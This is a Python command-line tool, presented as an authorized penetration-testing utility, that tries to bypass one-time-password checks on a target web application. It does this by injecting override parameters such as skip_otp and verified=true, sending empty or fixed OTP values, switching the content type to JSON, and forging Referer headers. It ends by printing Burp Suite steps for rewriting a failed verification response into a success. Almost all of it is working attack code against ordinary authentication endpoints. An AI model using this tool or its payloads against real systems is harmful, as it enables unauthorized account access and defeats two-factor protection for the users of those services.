#!/usr/bin/env python3
"""
OTP Bypass Tester - Response Manipulation & Validation Testing
Standalone CLI tool for comprehensive OTP vulnerability detection
Authorized Penetration Testing Tool - Use only on systems with explicit permission
"""

import requests
import sys
import argparse
import json
import time
from urllib.parse import urljoin, urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
██████╗ ████████╗██████╗     ██████╗ ██╗██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔══██╗╚══██╔══╝██╔══██╗    ██╔══██╗██║╚██╗ ██╔╝██╔══██╗██╔══██╗╚══███╔╝██╔════╝
██████╔╝   ██║   ██████╔╝    ██████╔╝██║ ╚████╔╝ ██████╔╝███████║  ███╔╝ █████╗  
██╔═══╝    ██║   ██╔═══╝     ██╔══██╗██║  ╚██╔╝  ██╔══██╗██╔══██║ ███╔╝  ██╔══╝  
██║        ██║   ██║         ██████╔╝██║   ██║   ██████╔╝██║  ██║███████╗███████╗
╚═╝        ╚═╝   ╚═╝         ╚═════╝ ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
        OTP Bypass via Response Manipulation - Penetration Testing Tool
"""


class OTPBypassTester:
    """Tests for OTP bypass vulnerabilities through response manipulation."""

    def __init__(self, target_url, session_cookie=None, headers=None, verify_ssl=False, proxy=None, timeout=15):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.timeout = timeout
        
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/html, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        if headers:
            self.headers.update(headers)
        if session_cookie:
            self.headers["Cookie"] = session_cookie
        
        self.session.headers.update(self.headers)
        
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
            print(f"[*] Using proxy: {proxy}")
        
        self.results = []

    def _send_raw(self, method, url, **kwargs):
        try:
            kwargs.setdefault("timeout", self.timeout)
            resp = self.session.request(method, url, **kwargs)
            return resp
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return None

    def test_response_body_manipulation(self, otp_endpoint, otp_payload):
        """Test response body boolean manipulation for OTP bypass."""
        print("\n" + "="*60)
        print("[TEST 1] Response Body Boolean Manipulation")
        print("="*60)
        
        success_patterns = [
            {"status": "success"}, {"status": "Success"},
            {"success": True}, {"success": "true"}, {"success": 1},
            {"verified": True}, {"error": None}, {"error": ""},
            {"message": "OTP verified successfully"},
            {"result": "ok"}, {"result": "success"},
        ]
        
        print(f"[*] Sending OTP verification request to: {otp_endpoint}")
        resp = self._send_raw("POST", otp_endpoint, data=otp_payload)
        
        if not resp:
            print("[!] Could not reach endpoint. Skipping test.")
            return
        
        print(f"[*] Original response status: {resp.status_code}")
        print(f"[*] Original response body: {resp.text[:300]}")
        
        print("\n[*] Attempting response manipulation bypasses...\n")
        
        override_payloads = [
            {"override": "true", "bypass": "true"},
            {"isValid": "true", "skipValidation": "true"},
            {"status": "success"}, {"result": "ok"},
            {"verified": "true"}, {"success": "true"},
        ]
        
        for override in override_payloads:
            test_data = {**otp_payload, **override}
            print(f"  [>] Trying payload override: {override}")
            r = self._send_raw("POST", otp_endpoint, data=test_data)
            if r:
                self._check_bypass_success(r, f"Override: {override}")
        
        self._print_test_summary("Response Body Manipulation")

    def test_status_code_manipulation(self, otp_endpoint, otp_payload):
        """Test HTTP status code manipulation."""
        print("\n" + "="*60)
        print("[TEST 2] HTTP Status Code Manipulation")
        print("="*60)
        
        resp = self._send_raw("POST", otp_endpoint, data=otp_payload)
        if not resp:
            return
        
        orig_status = resp.status_code
        print(f"[*] Original response status: {orig_status}")
        
        override_headers_list = [
            {"X-Override-Status": "200"},
            {"X-Accel-Buffering": "no"},
            {"Accept": "*/*"},
        ]
        
        for oh in override_headers_list:
            orig_headers = self.session.headers.copy()
            self.session.headers.update(oh)
            r = self._send_raw("POST", otp_endpoint, data=otp_payload)
            self.session.headers = orig_headers
            
            if r:
                self._check_bypass_success(r, f"Header override: {oh}")

    def test_client_side_validation(self, otp_endpoint, otp_payload):
        """Test if validation is client-side only."""
        print("\n" + "="*60)
        print("[TEST 3] Client-Side Validation Checks")
        print("="*60)
        
        variations = [
            {**otp_payload, "otp": ""},
            {**otp_payload, "otp": " "},
            {**otp_payload, "otp": "000000"},
            {**otp_payload, "otp": "999999"},
            {k: v for k, v in otp_payload.items() if "otp" not in k.lower()},
        ]
        
        seen = set()
        unique_variations = []
        for v in variations:
            key = str(sorted(v.items()))
            if key not in seen:
                seen.add(key)
                unique_variations.append(v)
        
        for i, var in enumerate(unique_variations):
            r = self._send_raw("POST", otp_endpoint, data=var)
            if r:
                self._check_bypass_success(r, f"Variation #{i+1}: empty/invalid OTP")
        
        self._print_test_summary("Client-Side Validation")

    def test_parameter_pollution(self, otp_endpoint, otp_payload):
        """Test parameter pollution and override attacks."""
        print("\n" + "="*60)
        print("[TEST 4] Parameter Pollution & Override")
        print("="*60)
        
        pollution_tests = [
            {"verified": "true"},
            {"skip_otp": "true"},
            {"validation": "skip"},
            {"mfa_status": "disabled"},
            {"status": "approved"},
        ]
        
        for pt in pollution_tests:
            test_data = {**otp_payload, **pt}
            r = self._send_raw("POST", otp_endpoint, data=test_data)
            if r:
                self._check_bypass_success(r, f"Pollution: {list(pt.keys())[0]}")
        
        self._print_test_summary("Parameter Pollution")

    def test_content_type_switch(self, otp_endpoint, otp_payload):
        """Test content-type switching attacks."""
        print("\n" + "="*60)
        print("[TEST 5] Content-Type Switching")
        print("="*60)
        
        json_payload = {}
        for k, v in otp_payload.items():
            try:
                json_payload[k] = int(v)
            except ValueError:
                json_payload[k] = v
        
        json_payload["verified"] = True
        
        headers_backup = self.session.headers.copy()
        self.session.headers["Content-Type"] = "application/json"
        r = self._send_raw("POST", otp_endpoint, json=json_payload)
        self.session.headers = headers_backup
        
        if r:
            self._check_bypass_success(r, "JSON with verified=true")
        
        self._print_test_summary("Content-Type Switching")

    def test_referer_bypass(self, otp_endpoint, otp_payload):
        """Test referer/origin manipulation."""
        print("\n" + "="*60)
        print("[TEST 6] Referer/Origin Manipulation")
        print("="*60)
        
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        
        referers = [
            base_url + "/dashboard",
            base_url + "/account",
            base_url + "/otp-success",
            base_url + "/",
        ]
        
        for ref in referers:
            orig_headers = self.session.headers.copy()
            self.session.headers["Referer"] = ref
            r = self._send_raw("POST", otp_endpoint, data=otp_payload)
            self.session.headers = orig_headers
            
            if r:
                self._check_bypass_success(r, f"Referer: {ref.split('/')[-1] or '/'}")
        
        self._print_test_summary("Referer Manipulation")

    def _check_bypass_success(self, response, description):
        """Check if response indicates successful bypass."""
        bypassed = False
        indicator = ""
        
        if response.status_code in (200, 201, 204, 302, 303):
            body = response.text.lower()
            success_keywords = [
                "verified", "success", "welcome", "dashboard",
                "authenticated", "logged in", "otp verified"
            ]
            
            for kw in success_keywords:
                if kw in body:
                    bypassed = True
                    indicator = f"keyword '{kw}'"
                    break
            
            if not bypassed and "application/json" in response.headers.get("content-type", ""):
                try:
                    j = response.json()
                    if isinstance(j, dict):
                        if j.get("success") in (True, "true", 1, "ok"):
                            bypassed = True
                            indicator = "JSON success=true"
                        elif j.get("status") in ("success", "ok"):
                            bypassed = True
                            indicator = "JSON status=success"
                except:
                    pass
        
        if bypassed:
            print(f"  [!!!] POTENTIAL BYPASS: {description}")
            print(f"        Status: {response.status_code} | {indicator}")
            self.results.append({
                "test": description,
                "status": response.status_code,
                "vulnerable": True
            })
        else:
            self.results.append({
                "test": description,
                "status": response.status_code,
                "vulnerable": False
            })

    def _print_test_summary(self, test_name):
        """Print summary of findings."""
        findings = [r for r in self.results if r.get("vulnerable")]
        if findings:
            print(f"\n  [RISK] Found {len(findings)} potential bypass(es)!")
        else:
            print(f"\n  [OK] No bypass detected in this test")

    def run_all(self, otp_endpoint, otp_payload):
        """Run all OTP bypass tests."""
        print(BANNER)
        print(f"[*] Target: {self.target_url}")
        print(f"[*] OTP Endpoint: {otp_endpoint}")
        print(f"[*] Base Payload: {otp_payload}")
        print(f"[*] Starting tests...\n")
        
        start_time = time.time()
        
        self.test_response_body_manipulation(otp_endpoint, otp_payload)
        self.test_status_code_manipulation(otp_endpoint, otp_payload)
        self.test_client_side_validation(otp_endpoint, otp_payload)
        self.test_parameter_pollution(otp_endpoint, otp_payload)
        self.test_content_type_switch(otp_endpoint, otp_payload)
        self.test_referer_bypass(otp_endpoint, otp_payload)
        
        elapsed = time.time() - start_time
        total_vuln = len([r for r in self.results if r.get("vulnerable")])
        
        print("\n" + "="*60)
        print("FINAL SUMMARY")
        print("="*60)
        print(f"[*] Total tests: {len(self.results)}")
        print(f"[*] Potential vulnerabilities: {total_vuln}")
        print(f"[*] Time elapsed: {elapsed:.2f}s")
        
        if total_vuln > 0:
            print("\n[!!!] VULNERABLE: OTP bypass detected!")
            print("[*] Validate manually with Burp Suite:")
            print("  1. Turn Intercept ON in Proxy → Intercept tab")
            print("  2. Submit wrong OTP and intercept the response")
            print("  3. Modify response: change 'success: false' → 'success: true'")
            print("  4. Forward modified response")
            print("  5. Check if you bypass authentication")
        else:
            print("\n[OK] No obvious OTP bypass vulnerabilities detected")


def main():
    parser = argparse.ArgumentParser(
        description="OTP Bypass Testing - Response Manipulation & Validation",
        epilog="""
Examples:
  python3 otp_bypass_cli.py -u https://example.com -e /verify-otp -d "otp=123456&email=test@example.com"
  python3 otp_bypass_cli.py -u https://example.com -e /otp/check -d "code=0000&phone=1234567890" -c "session=abc123"
  python3 otp_bypass_cli.py -u https://example.com -e /2fa -d "otp=999999" -p http://127.0.0.1:8080
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Base URL (e.g., https://example.com)")
    parser.add_argument("-e", "--endpoint", required=True, help="OTP endpoint path (e.g., /verify-otp)")
    parser.add_argument("-d", "--data", required=True, help="Form data (e.g., 'otp=123456&email=test@example.com')")
    parser.add_argument("-c", "--cookie", help="Session cookie")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    
    args = parser.parse_args()
    
    # Parse form data
    payload = {}
    for pair in args.data.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            payload[k.strip()] = v.strip()
    
    # Build full endpoint URL
    target_url = args.url.rstrip("/")
    endpoint = args.endpoint if args.endpoint.startswith("/") else f"/{args.endpoint}"
    full_endpoint = urljoin(target_url, endpoint)
    
    # Create and run tester
    tester = OTPBypassTester(
        target_url=target_url,
        session_cookie=args.cookie,
        verify_ssl=not args.insecure,
        proxy=args.proxy
    )
    
    try:
        tester.run_all(full_endpoint, payload)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)


if __name__ == "__main__":
    main()
